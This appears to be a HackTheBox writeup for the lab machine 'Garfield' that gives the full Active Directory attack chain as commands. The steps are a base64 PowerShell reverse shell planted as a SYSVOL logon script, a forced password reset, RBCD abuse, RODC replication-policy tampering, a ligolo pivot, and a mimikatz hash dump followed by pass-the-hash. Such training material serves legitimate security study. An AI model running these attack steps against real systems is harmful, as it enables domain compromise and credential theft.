🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Garfield — HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a7ee5b5ec5cb4c2bf96545fda71ea8e6.png" width="120"/>
<div>

**Difficulty**: Hard  
**OS**: Windows  
**Type**: Active Directory  

</div>
</div>

---

## Attack Chain Summary

```
j.arbuckle → Logon Script (SYSVOL) → l.wilson → ForceChangePassword → l.wilson_adm
→ RBCD on RODC01 → wmiexec Administrator@RODC01 → repadmin rodcpwdrepl
→ Mimikatz dump → Administrator NT Hash → ROOT
```

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC 10.129.x.x -oN scan.txt
```

Open ports: DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985), RDP (3389).  
Target: `DC01.garfield.htb` — Windows Server 2019.

### Starting Credentials

```
j.arbuckle / Th1sD4mnC4t!@1978
```

### LDAP Enumeration and AD Rights

```bash
ldapdomaindump -u 'garfield.htb\j.arbuckle' -p 'Th1sD4mnC4t!@1978' 10.129.x.x

bloodyAD -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.x.x get writable
```

`j.arbuckle` has WRITE rights on `CN=Liz Wilson` (`l.wilson`) and `CN=Liz Wilson ADM` (`l.wilson_adm`).

### SMB Enumeration

```bash
nxc smb 10.129.x.x -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -M spider_plus
```

In the NETLOGON share, we find `printerDetect.bat` — a logon script executed when `l.wilson` logs in.

---

## Foothold — Shell via Logon Script

### Generating the Reverse Shell

```bash
grep -v '^#' /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w0 > /tmp/b64.txt
B64=$(cat /tmp/b64.txt)
echo "powershell -e $B64" > /tmp/printerDetect.bat
```

### Uploading to SYSVOL

```bash
smbclient //10.129.x.x/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
  -c 'cd garfield.htb\scripts; put /tmp/printerDetect.bat printerDetect.bat'
```

### Setting l.wilson's scriptPath

```bash
bloodyAD -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.x.x \
  set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' scriptPath -v 'printerDetect.bat'
```

### Listener

```bash
nc -lvnp 9001
```

We receive a shell as `l.wilson`.

---

## User Flag

### Changing l.wilson_adm's Password

From the `l.wilson` shell:

```powershell
$newpass = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
```

### WinRM Connection

```bash
evil-winrm -i 10.129.x.x -u 'l.wilson_adm' -p 'WhoKnows123!'
```

```powershell
type C:\Users\l.wilson_adm\Desktop\user.txt
```

---

## Privesc — RODC Attack

### Enumerating l.wilson_adm's Rights

```bash
bloodyAD -u 'l.wilson_adm' -p 'WhoKnows123!' -d garfield.htb --host 10.129.x.x get writable
```

WRITE rights on `CN=RODC01`.

```bash
bloodyAD -u 'l.wilson_adm' -p 'WhoKnows123!' -d garfield.htb --host 10.129.x.x \
  get object 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb' \
  --attr msDS-KrbTgtLink,msDS-RevealOnDemandGroup,msDS-NeverRevealGroup,msDS-RevealedList
```

Key findings:
- The RODC uses `krbtgt_8245` (rodcNumber: **8245**)
- AES256 key of krbtgt_8245: `d6c93cbe006372ad....`
- RODC01 is on `192.168.100.2` (internal network)

### Adding ourselves to RODC Administrators

```bash
bloodyAD -u 'l.wilson_adm' -p 'WhoKnows123!' -d garfield.htb --host 10.129.x.x \
  add groupMember 'RODC Administrators' 'l.wilson_adm'
```

### Setting up RBCD (Resource-Based Constrained Delegation)

**Create a fake machine account:**

```bash
addcomputer.py -computer-name 'FAKE$' -computer-pass 'FakePass123!' \
  -dc-ip 10.129.x.x 'garfield.htb/l.wilson_adm:WhoKnows123!'
```

**Configure RBCD from evil-winrm:**

```powershell
Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$
```

### Modifying the RODC Replication Policy

Import PowerView and modify the RODC attributes to allow replication of the Administrator password:

```powershell
Import-Module .\PowerView.ps1

Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}

Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
```

Or via ldapmodify from Kali:

```bash
ldapmodify -x -H ldap://10.129.x.x -D 'l.wilson_adm@garfield.htb' -w 'WhoKnows123!' << 'EOF'
dn: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
changetype: modify
add: msDS-RevealOnDemandGroup
msDS-RevealOnDemandGroup: CN=Administrator,CN=Users,DC=garfield,DC=htb
EOF
```

### Ligolo Tunnel to the Internal Network

RODC01 (`192.168.100.2`) is not directly reachable, so we pivot through DC01 using Ligolo.

**Kali:**
```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

**DC01 (evil-winrm):**
```powershell
upload agent.exe
.\agent.exe -connect 10.10.x.x:11601 -ignore-cert
```

**Ligolo CLI:**
```
session
start
```

**Add the route:**
```bash
sudo ip route add 192.168.100.0/24 dev ligolo
```

### Getting an Administrator Shell on RODC01 via RBCD

```bash
sudo ntpdate 10.129.x.x
unset KRB5CCNAME
getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator \
  -dc-ip 10.129.x.x 'garfield.htb/FAKE$:FakePass123!'
export KRB5CCNAME='Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache'
wmiexec.py -k -no-pass -target-ip 192.168.100.2 garfield.htb/Administrator@RODC01.garfield.htb
```

### Forcing Replication of Administrator's Credentials

From the shell on RODC01:

```
repadmin /rodcpwdrepl RODC01 DC01 "CN=Administrator,CN=Users,DC=garfield,DC=htb"
```

Expected output: `Successfully replicated secrets for user CN=Administrator...`

### Dumping the Administrator Hash with Mimikatz

Copy mimikatz to RODC01 (already present in `C:\Windows\Temp\` from a previous step):

```
C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:Administrator" exit
```

We get the Administrator hash.

---

## Root Flag

```bash
evil-winrm -i 10.129.x.x -u Administrator -H <NTLMHASH>
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Tools Used

- `nmap` — port scanning
- `ldapdomaindump` — LDAP enumeration
- `bloodyAD` — AD object manipulation
- `nxc` (NetExec) — SMB enumeration
- `smbclient` — file upload to SYSVOL
- `nishang` — PowerShell reverse shell
- `evil-winrm` — WinRM shell
- `PowerView` — AD object manipulation
- `impacket` (addcomputer, getST, wmiexec) — Kerberos / RBCD attacks
- `ligolo-ng` — tunnel to internal network
- `mimikatz` — credential dumping
- `repadmin` — RODC password replication

---

## Key Notes

- The AES256 key of `krbtgt_8245` (`d6c93cbe...`) is a fixed value for this box
- The box requires modifying `msDS-NeverRevealGroup` and `msDS-RevealOnDemandGroup` on RODC01 before credentials can be replicated